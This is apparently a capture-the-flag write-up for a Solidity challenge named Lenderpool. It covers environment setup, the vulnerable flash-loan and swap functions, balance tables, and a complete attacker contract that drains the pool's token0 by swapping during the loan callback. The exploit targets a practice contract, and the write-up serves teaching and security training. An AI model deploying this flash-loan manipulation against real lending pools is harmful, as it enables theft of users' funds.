# Lenderpool

## Introduction
The objective is to drain all available ``token0`` from ``lenderPool``. 

## Environment
These are the IDEs and langauges used to set up the environment.

- Remix IDE

- Ganache-cli


## Setup
Here's a quick setup 

1) Download ganache-cli with ``yarn global add ganache``

2) Run ganache-cli with ``ganache-cli``

3) Go to remix IDE -> Deploy & Run transaction -> Environment -> Choose 'Dev - Ganache Provider'

4) Create a solidity file -> copy and paste the smart contract 

5) Compile and deploy

6) Start messing around

## Code Breakdown

There are 2 contracts to look at **LenderPool** and **Check**

### Check

The first thing to look at is function ``isSolved()``. The clear condition is to drain all ``token0`` from ``lenderPool``.
```
function isSolved()  public view returns(bool){
    if(token0.balanceOf(address(lenderPool)) == 0){
        return  true;
    }
    return false;
}
```

### LenderPool

The next 2 functions to look at is **swap** and **flashLoan**

**flashLoan**

This is a simple flash loan function that can only be called by another smart contract. 

Here's an ELI5 of what it does:
- You can only flash loan ``token0``
- Ensure that the current balance of ``token0`` is equal or more than the amount that is needed to be borrowed
- It calls for the function ``receiveEther(uint256)`` in the calling contract
- It checks the current balance after flash loan to ensure that the amount is the same or more than before the loan.
```
uint256 balanceAfter = token0.balanceOf(address(this)); 
require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
```

**swap**

This function swaps the amount of ``token0`` with ``token1`` vice versa.


## Hints

You'll need to create a smart contract to do the following:

1) Flash loan all available ``token0`` in ``LenderPool``
2) Using the **swap** function, convert ``token1`` to ``token0`` to trick the smart contract into 'returning' the flashloan
3) Using the **swap** function, convert the remaining ``token0`` into ``token1``

## Solutions

The confusing portion is the ``swap`` function.

Here's the detailed breakdown of what is happening.

<em>Note: There is 100000000000000000000 available tokens but for simplicity sake, I'll just put it as 100.</em>

This is the default setup in **LenderPool**

| LenderPool || Attacker||
| - | - | - | - |
| ``token0`` | ``token1`` | ``token0`` | ``token1`` |
| 100 | 100 | 0 | 0 |


After calling ``receiveFlashLoan()``.

<em>Note: Function is based on the solution provided at the bottom</em>
| LenderPool || Attacker||
| - | - | - | - |
| ``token0`` | ``token1`` | ``token0`` | ``token1`` |
| 0 | 100 | 100 | 0 |


**LenderPool** calls for ``receiveEther(uint256)`` in attacker contract

A swap in **LenderPool** is conducted where all ``token1`` is converted to ``token0``.
| LenderPool || Attacker||
| - | - | - | - |
| ``token0`` | ``token1`` | ``token0`` | ``token1`` |
| 100 | 0 | 100 | 0 |



**LenderPool** checks that ``token0`` is the same as before the flashloan.

With that, ``flashLoan`` ended.

Using ``swap`` again, we'll convert existing ``token0`` into ``token1`` in **LenderPool**.
| LenderPool || Attacker||
| - | - | - | - |
| ``token0`` | ``token1`` | ``token0`` | ``token1`` |
| 0 | 100 | 100 | 0 |

As such, **LenderPool** has 0 ``token0``. 

Calling ``isSolved()`` from **Check** will return true.

Here's the attacker smart contract.
```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

import './lender_pool.sol';

contract LenderPool_attack {

    LenderPool public lenderPool;
    IERC20 public token0;
    IERC20 public token1;

    constructor(LenderPool _lenderPool){
        lenderPool = LenderPool(_lenderPool);
        token0 = lenderPool.token0();
        token1 = lenderPool.token1();
    }

    function getTokens() public view returns (uint256, uint256){
        return (token0.balanceOf(address(lenderPool)), token1.balanceOf(address(lenderPool)));
    }

    function receiveEther(uint256 amount) external{
        lenderPool.swap(address(token1), amount);
    }

    function receiveFlashLoan() public{
        token0.approve(address(lenderPool), token0.balanceOf(address(lenderPool)));
        token1.approve(address(lenderPool), token1.balanceOf(address(lenderPool)));
        lenderPool.flashLoan(
            token0.balanceOf(address(lenderPool)),
            address(this)
        );
        lenderPool.swap(address(token0), token0.balanceOf(address(lenderPool)));
    }
}
```

